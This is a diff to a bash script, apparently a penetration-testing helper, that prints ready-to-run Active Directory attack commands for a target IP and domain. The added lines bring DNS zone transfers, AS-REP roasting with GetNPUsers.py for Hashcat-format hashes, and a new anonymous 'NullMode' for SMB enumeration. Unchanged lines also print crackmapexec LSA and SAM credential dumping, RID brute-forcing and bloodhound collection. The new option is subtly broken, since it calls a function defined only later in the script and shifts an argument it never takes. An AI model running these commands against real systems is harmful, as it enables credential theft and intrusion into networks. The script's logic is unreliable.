@@ -19,7 +19,8 @@ GC="";		#
 
 
 # Wordlists
-UserList="/usr/share/seclists/Usernames/Names/names.txt"
+UserList="'/usr/share/seclists/Usernames/Names/names.txt'"
+
 
 ################################################################################
 # Options                                                                      #
@@ -58,7 +59,16 @@ while [ $# -gt 0 ]; do
                 Domain="'$2'";
                 shift
                 shift
-                ;;                                                                               
+                ;;   
+
+	-N | --NullMode)
+                Username="''";
+                Anonymous="'anonymous'";
+            	Password="''";
+            	NullMode;
+                shift
+                shift
+                ;;                                                                                            
                 
         *)
                 POSITIONAL="${POSITIONAL} $1"
@@ -66,7 +76,6 @@ while [ $# -gt 0 ]; do
                 ;;
         esac
 done
-
 
 ###############################################################################
 # Help                                                                         #
@@ -86,22 +95,6 @@ Help()
    echo "V     Print software version and exit."
    echo
 }
-
-################################################################################
-# Null                                                                    #
-################################################################################
-
-null() 
-{
-
-echo -e '\e[1mAnon Mode\033[0m'
-
-}
-
-################################################################################
-# User Discovery                                                               #
-################################################################################
-
 
 
 
@@ -165,12 +158,17 @@ echo -e "${LGREEN}DNS${RESTORE}"
 echo -e ""
 echo -e "nmap --script dns-brute --script-args dns-brute.threads=12 '$Domain'"
 echo -e "dnsenum --dnsserver $IP --enum '$Domain'"
+echo -e "dig AXFR $Domain @$IP"
+echo -e "fierce -dns $Domain"
 echo -e ""
 echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
 
 # Kerberos
 echo -e "${LGREEN}Kerberos${RESTORE}"
+echo -e ""
+echo -e "GetNPUsers.py $Domain -usersfile $UserList  -dc-ip $IP -format 'Hashcat'"
+echo -n -e "GetNPUsers.py $Domain/$Username:$Password -request -dc-ip $IP -format 'Hashcat'" ;echo -e " ${YELLOW}# Requires valid credentials${RESTORE}"
 echo -e ""
 echo -e "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='$Domain',userdb='$UserList' '$IP'"
 echo -e "msfconsole -q -x 'use auxiliary/gather/kerberos_enumusers; set rhost $IP; set lport 4444; set DOMAIN $Domain; set USER_FILE $UserList; exploit'"
@@ -192,13 +190,15 @@ echo -e "${LGREEN}SMB${RESTORE}"
 echo -e ""
 echo -e "nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -p 139,445 $IP"
 echo -e ""
-echo -e "enum4linux -u '$Username' -p '$Password' -r $IP| grep 'Local User'"
+echo -e "nmblookup -A $IP"
 echo -e ""
-echo -e "smbmap -H '$IP' -u '$Username' -p '$Password'"
+echo -e "enum4linux -u $Username -p $Password -r $IP| grep 'Local User'"
 echo -e ""
-echo -e "smbclient -U '' -P '' -L '$IP'"
+echo -e "smbmap -H $IP -u $Username -p $Password"
 echo -e ""
-echo -e "crackmapexec smb $IP -u '$Username' -p '$Password'"
+echo -e "smbclient -U '' -P '' -L $IP"
+echo -e ""
+echo -e "crackmapexec smb $IP -u $Username -p $Password"
 echo -e "crackmapexec smb $IP -u $Username -p $Password --rid-brute"
 echo -e "crackmapexec smb $IP -u $Username -p $Password --lsa"
 echo -e "crackmapexec smb $IP -u $Username -p $Password --sam"
@@ -243,3 +243,26 @@ echo -e "python2 bloodhound.py -u $Username -p $Password -ns $IP -d $Domain"
 echo -e ""
 echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
+
+################################################################################
+# Null Mode                                                                    #
+################################################################################
+
+NullMode()
+{
+
+
+echo -e "${LGREEN}SMB${RESTORE}"
+echo -e ""
+echo -e "nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -p 139,445 $IP"
+echo -e ""
+echo -e "nmblookup -A $IP"
+echo -e ""
+echo -e "enum4linux -u $Username -p $Password -r $IP| grep 'Local User'"
+echo -e ""
+echo -e "smbmap -H $IP -u $Username -p $Password"
+echo -e ""
+echo -e "smbclient -U '' -P '' -L $IP"
+
+}
+
